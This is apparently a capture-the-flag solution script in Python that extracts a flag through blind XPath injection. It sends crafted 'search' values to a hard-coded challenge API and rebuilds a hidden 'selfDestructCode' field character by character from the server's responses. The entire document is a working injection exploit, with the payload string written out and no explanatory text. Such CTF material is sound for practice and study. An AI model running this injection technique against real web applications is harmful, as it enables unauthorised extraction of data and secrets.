import requests
import string
from time import sleep

flag_pt1 = "CHTB{Th3_3xTr4_l3v3l_"
flag = "4Cc3s$_c0nTr0l}"
url = "http://139.59.168.47:30661/api/search"

# Each time a successful login is seen, restart loop
restart = True
count = len(flag) + 1

while restart:
    restart = False
    for char in "_" + string.ascii_letters + string.digits + "!#$%^()@{}£&*-=+.,~:;[]":
		# Update position index for the 2 seperate flag parts
        post_data = {"search": "' or substring((/military/district[position()=3]/staff[position()=2]/selfDestructCode)," + str(count) + ",1)=\"" + char + "\" or ''=' "}
        print(post_data)
        try:
            r = requests.post(url, json=post_data, headers={'Content-Type': 'application/json'})
        except BaseException:
            pass
        # Correct char results in "successful password"
        if 'exists' in r.text:
            restart = True
            count += 1
            flag += char
            print(flag)
            # Exit if "}" gives a valid redirect
            if char == "}":
                print("\nFlag: " + flag)
                exit(0)
            break

        sleep(1)
